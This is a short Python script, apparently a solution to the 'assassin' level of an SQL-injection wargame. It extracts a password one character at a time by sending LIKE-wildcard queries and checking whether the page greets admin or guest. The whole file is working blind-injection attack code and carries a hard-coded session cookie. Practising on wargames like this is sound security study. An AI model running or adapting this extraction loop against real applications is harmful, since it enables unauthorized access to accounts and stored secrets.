# -*- coding: utf-8 -*-
import urllib.request

answer = ""
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
session_id = "PHPSESSID=" + "r20vqh3ueh69ra247b0fvjprgs"

url_start = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php" + '?'

word = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
        'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

for i in range(1, 9):
    try:
        for j in range(len(word)):
            query = answer+str(word[j])+'%'
            url = url_start + 'pw='+query

            print(url)

            req = urllib.request.Request(url)  # 엔터 치기전 상태
            req.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
            req.add_header("Cookie", session_id)

            res = urllib.request.urlopen(req)  # 엔터누른 효과
            data = res.read().decode('utf-8')  # 본문만 가져오기

            #print(data)

            if data.find('<h2>Hello admin</h2>') != -1:
                print(word[j])
                answer += str(word[j])
                break
            if data.find('<h2>Hello guest</h2>') != -1:
                print(word[j])
                answer += str(word[j])
                break

    except Exception as e:
        continue

print(answer)